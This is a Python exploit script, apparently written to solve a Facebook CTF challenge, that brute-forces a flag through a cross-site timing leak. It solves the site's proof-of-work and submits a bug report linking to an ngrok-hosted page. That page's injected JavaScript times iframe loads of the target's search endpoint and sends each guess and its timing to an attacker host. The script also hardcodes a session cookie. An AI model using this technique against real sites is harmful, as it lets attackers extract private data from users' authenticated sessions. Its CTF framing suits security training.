from requests import *
from time import sleep
from hashlib import md5
from time import sleep

# with open('/home/rex/Documents/CTF/Tools/rockyou.txt') as f: l = [x[:-1] for x in f.readlines()]

def Check(PoW):
    for i in range(10000000):
        if md5(str(i)).hexdigest()[:5] == PoW:
            return str(i)

url = 'http://challenges.fbctf.com:8082/report_bugs'

head = {
    
}
sess = '.eJwlzjsOwjAMANC7eO4Q_xsug2LHEawtnRB3B4n5Le8N93XU-YDb67hqg_tzwg3MBVvQ6oOWZvjI1Ck9aLRk5ZAlVj1bWFY0JJvdVUSJLbkqh_GwsXhihq6uqBI8l-APZaY1mlHotLfhjXtEIFET32sndxTY4Drr-GccPl-_Zy7q.XPQN2Q.VExVY9lxVToWXCITe8AbudEEIxg'
cookies = {
    'session': sess
}

data = {
    'title': '2',
    'body': 'Body',
    'link': 'http://92232aa9.ngrok.io/'
}

html1 = '''
<!DOCTYPE html>
<html>
<body onload="cors()">
<center>  
	<h1>Nothing here bot</h1>
</div>
</body>
<script>
function cors() {
	var ig = "'''
html2 = '''";
 	var iframe = document.createElement('iframe');
	iframe.setAttribute('t1', (new Date()).getTime());
	iframe.setAttribute('src', "http://challenges.fbctf.com:8082/search?query="+ig);
	iframe.onload = function () {
    	var t2 = (new Date()).getTime() - parseInt(this.getAttribute('t1')) ;
    	 send(t2 , ig) ;
	}
	document.body.appendChild(iframe); 
}
function send(val,ig) {
	document.write('<img src="http://92232aa9.ngrok.io/attack.php?a='+ig+'&b='+val+'">')	
}
</script>
</html>
'''
def Try(Str):
	with open("index.php","w") as F:
		F.write(html1+Str+html2)
	with session() as s:
	    sc = s.get(url, cookies = cookies, headers = head).text
	    a = sc.find('proof of work for')
	    PoW = str(sc[a+18:sc.find('(', a)-1])
	    text = Check(PoW)
	    data['pow_sol'] = text
	    s.post(url, data = data)
	sleep(3)
	A = get("http://localhost/check.php").text
	print(A)
	a,b = A.split(" ~^~ ")
	return str(a)

# 795685 _0123456789abcdefghijklmno
Chars = 'pqrstuvwxyz:(){|}!,.-'

flag = "fb{cr055_s173_l3"+"_"*8

Try(flag)
for i in Chars:
	c = Try(flag+i)[-1]
	if c != i:
		print(c,i)
		Try(flag+i)

